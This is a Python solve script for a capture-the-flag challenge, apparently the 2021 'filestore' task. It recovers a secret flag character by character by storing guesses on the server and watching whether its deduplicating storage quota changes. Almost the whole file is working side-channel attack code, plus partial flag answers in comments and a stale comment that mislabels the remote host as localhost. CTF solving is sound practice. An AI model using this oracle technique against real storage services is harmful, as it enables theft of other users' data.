import socket

CTF_PREFIX = "CTF{"
CTF_SUFFIX = "}"
QUOTA_STRING = "Quota: 0.026kB/64.000kB"
QUOTA_INDEX = 2
lowercase_letters = "abcdefghijklmnopqrstuvwxyz"
numbers = "0123456789"
uppercase_letters = lowercase_letters.upper()

if __name__ == "__main__":
    ctf_flag = CTF_PREFIX
    # for each character in [lowercase_letters, numbers, uppercase_letters]
    # connect to server
    # enter store
    # enter CTF{ + guess
    # if quota > INITIAL_QUOTA # incorrect
    # if quota == INITIAL_QUOTA # correct
    # add guess to ctf_flag
    # kill connection
    # start over

    HOST = 'filestore.2021.ctfcompetition.com'  # Standard loopback interface address (localhost)
    PORT = 1337        # Port to listen on (non-privileged ports are > 1023)
    current_matched_flag = "CTF{CR1M3_0f_d3d_0f_d3dup1ic4ti0_0f_d3dup1ic4ti"
    # CTF{CR1M3_0f_d3d _0f_d3dup1ic4ti0 _0f_d3dup1ic4ti0_d3d_0f_CR1M3}
    # CTF{CR1M3_0f_d3d _0f_d3dup1ic4ti0 _0f_d3dup1ic4ti0 _d3du
    # CTF{CR1M3_0f_d3d_0f_d3dup1ic4ti0n_0f_d3dup1ic4ti0n_d3dup1ic4ti0n}
    while True:
        for c in "_" + lowercase_letters+numbers+uppercase_letters+"}~`!@#$%^&*()-+={[]\|;:'\",.<?/>":
            if current_matched_flag[len(current_matched_flag) -1] == "}":
                print(current_matched_flag)
                print("YOU WIN")
                break
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect(('filestore.2021.ctfcompetition.com', 1337))
                with s:
                    print("trying:" + c)
                    data = s.recv(1024) # proof-of-work ...
                    #print(data)
                    data = s.recv(1024) # Welcome ...
                    #print(data)
                    s.send(b"store\n")
                    data = s.recv(1024)
                    #print(data) # send a line ...
                    to_send = bytes(current_matched_flag + c + "\n", encoding='utf-8')
                    #print(to_send)
                    s.send(bytes(current_matched_flag + c + "\n", encoding='utf-8')) # current_matched_flag = CTF{...
                    data = s.recv(1024) # our file ID
                    #print(data)
                    s.send(b"status\n")
                    data = s.recv(1024) # because the server sends a string, it gets captured in a single 1024 buffer on the socket
                    data = s.recv(1024) # we need to receive the next string which has the quota
                    # second element is the quota string
                    status_output = data.decode(encoding="utf-8").splitlines()
                    #print(status_output)
                    quota_not_changed = any([result for result in status_output if result == QUOTA_STRING])
                    if quota_not_changed:
                        current_matched_flag = current_matched_flag + c
                        print("matched!!!" + current_matched_flag)
                        s.close()
                        break
                    s.close()
                    # print(data.decode(encoding="utf-8").splitlines())
